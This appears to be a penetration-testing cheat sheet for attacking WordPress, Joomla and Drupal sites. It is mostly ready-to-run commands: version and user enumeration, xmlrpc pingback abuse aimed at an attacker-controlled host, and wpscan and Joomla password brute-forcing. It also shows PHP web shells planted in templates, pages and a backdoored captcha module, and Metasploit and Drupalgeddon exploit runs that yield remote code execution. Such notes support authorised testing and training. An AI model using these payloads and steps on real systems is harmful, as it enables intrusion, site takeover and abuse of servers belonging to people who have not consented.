# Content Management Systems (CMS)

Here we will discuss the three most well-known and widely used CMSs:

- WordPress
- Joomla
- Drupal

## Wordpress

### Discovery/Footprinting

/robots.txt
````
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://<domain>/wp-sitemap.xml
````
**Version**
````
$ curl -s http://<domain> | grep WordPress
````
**Themes**
````
$ curl -s http://<domain>/ | grep themes
````
**Plugins**
````
$ curl -s http://<domain>/ | grep plugins
````
**Users**
````
1) Login Error messages
2) https://wordpressexample.com/wp-json/wp/v2/users
````
**xmlrpc**

List all methods
````
$ curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://<domain>/xmlrpc.php
````
Unfortunately, if pingbacks are available, they can facilitate:
- IP Disclosure - An attacker can call the pingback.ping method on a WordPress instance behind Cloudflare to identify its public IP. The pingback should point to an attacker-controlled host (such as a VPS) accessible by the WordPress instance.
- Cross-Site Port Attack (XSPA) - An attacker can call the pingback.ping method on a WordPress instance against itself (or other internal hosts) on different ports. Open ports or internal hosts can be identified by looking for response time differences or response differences.
- Distributed Denial of Service Attack (DDoS) - An attacker can call the pingback.ping method on numerous WordPress instances against a single target.

Pingback.Ping
````
POST /xmlrpc.php HTTP/1.1 
Host: <domain> 
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://attacker-controlled-host.com/</string></value>
</param>
<param>
<value><string>https://<domain>/2015/10/what-is-cybersecurity/</string></value>
</param>
</params>
</methodCall>
````

### WPSCAN

**Enumeration**
````
$ sudo wpscan --url http://<domain> --enumerate --api-token dEOFB<SNIP>
$ sudo wpscan --url http://<domain> --enumerate u --api-token dEOFB<SNIP> (users)
$ sudo wpscan --url http://<domain> --enumerate vt --api-token dEOFB<SNIP> (Vulnerable Themes)
$ sudo wpscan --url http://<domain> --enumerate vp -api-token dEOFB<SNIP> (Vulnerable Plugins)
````

**Login Brute Force**
````
$ sudo wpscan --password-attack xmlrpc -t 20 -U <user/users_list> -P /usr/share/wordlists/rockyou.txt --url http://<domain>
````

**Code Execution**
````
1) Theme's Page
- Appearance -> Theme Editor
- 404 Template (Example)
- Insert system($_GET[0]);
- Save
- $ curl http://<domain>/wp-content/themes/twentynineteen/404.php?0=id
````
````
2) Metasploit
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username <user>
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password <user_password>
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost <Our_IP> 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost <server_IP>  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST <domain>
````
````
3) Vulnerable Plugin/Theme
````

## Joombla

### Enumeration
````
$ curl -s http://<domain>/ | grep Joomla
$ curl -s http://<domain>/README.txt | head -n 5
$ curl -s http://<domain>/administrator/manifests/files/joomla.xml | xmllint --format -
````
/robots.txt
````
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
````

### Droopescan & JoomlaScan

````
$ sudo pip3 install droopescan
$ droopescan scan joomla --url http://<domain>/
````
````
https://github.com/drego85/JoomlaScan
$ sudo python2.7 -m pip install urllib3
$ sudo python2.7 -m pip install certifi
$ sudo python2.7 -m pip install bs4
$ python2.7 joomlascan.py -u http://<domain>

https://github.com/OWASP/joomscan
````

### Brute Force Credentials
````
$ sudo python3 joomla-brute.py -u http://<domain> -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <user>
````

### Code Execution

**Abusing Built-In Functionality**
````
- http://<domain>/administrator
- Templates -> Configuration
- Click on a template name
- protostar
- Choose page to edit (error.php)
- Add system($_GET['cmd']);
- Save & Close
- $ curl -s http://<domain>/templates/protostar/error.php?cmd=id
````
**Known Vulnerabilities**
````
Affects version 3.9.4 vulnerable to CVE-2019-10945
$ python2.7 joomla_cve.py --url "http://<domain>/administrator/" --username admin --password admin --dir /
````

## Drupal 

Drupal supports three types of users by default:
- Administrator: This user has complete control over the Drupal website.
- Authenticated User: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
- Anonymous: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.

### Enumeration

````
$ curl -s http://<domain> | grep Drupal
$ curl -s http://<domain>/CHANGELOG.txt | grep -m2 ""
$ droopescan scan drupal -u http://<domain>
````
Another way to identify Drupal CMS is through nodes. Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form /node/<nodeid>

### Code Execution

**PHP Filter Module**
````
1 - http://<domain>/#overlay=admin/modules and activate "PHP Filter"
2 - Content --> Add content and create a Basic page
3 - Create a new page and add
<?php
system($_GET['cmd']);
?>
4 - Text format: PHP code
5 - Save
$ curl -s http://<domain>/node/3?cmd=id | grep uid | cut -f4 -d">"

----------------------------------------------------------------------------------------

From version 8 onwards, the PHP Filter module is not installed by default.
$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2 - Administration > Reports > Available updates
3 - Click on Browse, select the file from the directory we downloaded it to, and then click Install
4 - Once the module is installed repeat previous process
````

**Uploading a Backdoored Module**
````
$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
$ tar xvf captcha-8.x-1.2.tar.gz
$ echo "<?php system($_GET['cmd']); ?>" > shell.php
4) Create .htaccess
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
$ mv shell.php .htaccess captcha
$ tar cvf captcha.tar.gz captcha/
5) Manage > Extend > + Install new module (http://<domain>/admin/modules/install)
$ curl -s http://<domain>/modules/captcha/shell.php?cmd=id
````
**Drupalgeddon**

Affects versions 7.0 up to 7.31 (CVE-2014-3704)

This vulnerability will create a new admin account
````
$ python2.7 drupalgeddon.py -t http://<domain> -u hacker -p pwnd

Once an admin user is added, we could log in and enable the PHP Filter module to achieve remote code execution. 
````
**Drupalgeddon2**

Affects versions of Drupal prior to 7.58 and 8.5.1 (CVE-2018-7600)
````
$ python3 drupalgeddon2.py
$ curl http://<domain>/shell.php?cmd=id
````
**Drupalgeddon3**

Affects multiple versions of Drupal 7.x and 8.x (CVE-2018-7602)

It requires a user to have the ability to delete a node
````
Metasploit
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts <Server-IP>
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST <domain>   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session <Drupal_Session>
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST <Our_IP>
msf6 exploit(multi/http/drupal_drupageddon3) > show options 
msf6 exploit(multi/http/drupal_drupageddon3) > run
````
